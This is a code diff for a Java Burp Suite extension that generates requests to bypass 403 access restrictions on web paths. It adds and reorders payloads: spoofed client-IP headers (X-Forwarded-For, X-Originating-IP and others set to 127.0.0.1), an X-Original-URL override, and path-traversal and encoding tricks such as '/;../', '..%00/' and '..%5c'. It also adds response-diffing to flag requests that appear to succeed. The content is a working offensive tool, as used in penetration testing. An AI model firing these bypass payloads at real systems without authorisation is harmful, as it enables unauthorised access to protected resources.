@@ -1,9 +1,6 @@
 package Main;
 
-import burp.BurpExtender;
-import burp.IContextMenuFactory;
-import burp.IContextMenuInvocation;
-import burp.IHttpRequestResponse;
+import burp.*;
 import org.apache.commons.lang3.StringUtils;
 
 import javax.swing.*;
@@ -16,7 +13,6 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 public class BypassMain implements IContextMenuFactory {
-//    private static int thread_num = 5;
 
     public List<BaseRequest> make_suffix(String prefix, String target) {
         List<BaseRequest> baseRequestList = new ArrayList();
@@ -34,19 +30,21 @@ public class BypassMain implements IContextMenuFactory {
 
         baseRequestList.add(new BaseRequest("GET",   prefix + "/./" + target + "/./", null));
 
+
+        headers.put("X-Custom-IP-Authorization", "127.0.0.1");
+        headers.put("X-Forwarded-For", "127.0.0.1");
+        headers.put("X-Client-IP", "127.0.0.1");
+        headers.put("X-Remote-Addr", "127.0.0.1");
+        headers.put("X-Originating-IP", "127.0.0.1");
+        headers.put("Referer", "http://127.0.0.1");
+        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
+        headers.clear();
+
         headers.put("X-Original-URL", target);
         baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
         headers.clear();
 
-        headers.put("X-Custom-IP-Authorization", "127.0.0.1");
-        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
-        headers.clear();
-
         headers.put("X-Forwarded-For", "http://127.0.0.1");
-        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
-        headers.clear();
-
-        headers.put("X-Forwarded-For", "127.0.0.1");
         baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
         headers.clear();
 
@@ -94,6 +92,16 @@ public class BypassMain implements IContextMenuFactory {
 
         baseRequestList.add(new BaseRequest("GET",   prefix + "/images;/../" + target, null));
         baseRequestList.add(new BaseRequest("GET",   prefix + "/images/..;/" + target, null));
+
+
+        //Laura_小狮子
+        baseRequestList.add(new BaseRequest("GET",  prefix + "/;../" + target, null));
+        baseRequestList.add(new BaseRequest("GET",  prefix + "/" + target + "/%26", null));
+        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + ".php", null));
+        baseRequestList.add(new BaseRequest("GET",  prefix + "/..%00/" + target, null));
+        baseRequestList.add(new BaseRequest("GET",  prefix + "/..%0d/" + target, null));
+        baseRequestList.add(new BaseRequest("GET",  prefix + "/..%5c" + target, null));
+        //Laura_小狮子
 
         return baseRequestList;
 
@@ -248,12 +256,23 @@ public class BypassMain implements IContextMenuFactory {
 
             try {
                 IHttpRequestResponse resRequestReponse = Utils.callbacks.makeHttpRequest(iHttpRequestResponse.getHttpService(), Utils.helpers.stringToBytes(new_request));
-                if (resRequestReponse != null) {
+
+
+                String old_response = new String(iHttpRequestResponse.getResponse());
+                String new_response = new String(resRequestReponse.getResponse());
+                short old_status = Utils.helpers.analyzeResponse(iHttpRequestResponse.getResponse()).getStatusCode();
+                short new_status = Utils.helpers.analyzeResponse(resRequestReponse.getResponse()).getStatusCode();
+
+                //Utils.panel.addFinishRequestNum(1);
+                addFinishRequestNum(1);
+
+                if (resRequestReponse != null && (DiffPage.getRatio(old_response, new_response) < 0.8 ||  old_status != new_status)) {
                     addLog(resRequestReponse, 0, 0, 0);
                 }
 
 
             }catch(Throwable ee) {
+                Utils.panel.addErrorRequestNum(1);
 
             }
         }
@@ -272,24 +291,32 @@ public class BypassMain implements IContextMenuFactory {
                 public void actionPerformed(ActionEvent e) {
 
                     new Thread(() -> {
-                        IHttpRequestResponse iHttpRequestResponse = invocation.getSelectedMessages()[0];
+                        IHttpRequestResponse[] iHttpRequestResponses = invocation.getSelectedMessages();
+                        for(IHttpRequestResponse iHttpRequestResponse : iHttpRequestResponses) {
+                            String old_path = Utils.helpers.analyzeRequest(iHttpRequestResponse).getUrl().getPath();
+                            String old_request = Utils.helpers.bytesToString(iHttpRequestResponse.getRequest());
+                            String old_method = Utils.helpers.analyzeRequest(iHttpRequestResponse).getMethod();
+                            IResponseInfo response = Utils.helpers.analyzeResponse(iHttpRequestResponse.getResponse());
 
-                        String old_path = Utils.helpers.analyzeRequest(iHttpRequestResponse).getUrl().getPath();
-                        String old_request = Utils.helpers.bytesToString(iHttpRequestResponse.getRequest());
-                        String old_method = Utils.helpers.analyzeRequest(iHttpRequestResponse).getMethod();
+                            List<BaseRequest> allRequests;
+                            allRequests = make_payload(old_path);
 
-                        List<BaseRequest> allRequests;
-                        allRequests = make_payload(old_path);
-
-                        int thread_num = Utils.panel.getThreadNum();
+                            int thread_num = Utils.panel.getThreadNum();
 
 
-                        Utils.out("start thread, number: " + String.valueOf(thread_num) + " path: " + old_path);
-                        ExecutorService es = Executors.newFixedThreadPool(thread_num);
-                        for(BaseRequest baseRequest: allRequests) {
-                            es.submit(new Run_request(baseRequest, old_path, old_request, old_method, iHttpRequestResponse));
+                            Utils.out("start thread, number: " + String.valueOf(thread_num) + " path: " + old_path);
+                            ExecutorService es = Executors.newFixedThreadPool(thread_num);
+
+                            //计算请求数量
+                            //Utils.panel.addAllRequestNum(allRequests.size());
+                            addAllRequestNum(allRequests.size());
+                            for(BaseRequest baseRequest: allRequests) {
+
+                                es.submit(new Run_request(baseRequest, old_path, old_request, old_method, iHttpRequestResponse));
+
+                            }
+                            es.shutdown();
                         }
-                        es.shutdown();
                     }).start();
 
                 }
@@ -312,6 +339,12 @@ public class BypassMain implements IContextMenuFactory {
     }
 
 
+    private static synchronized void addAllRequestNum(int num) {
+        Utils.panel.addAllRequestNum(num);
+    }
+    private static synchronized  void addFinishRequestNum(int num) {
+        Utils.panel.addFinishRequestNum(1);
+    }
 //    public void setThread_num(int number) {
 //        thread_num = number;
 //    }
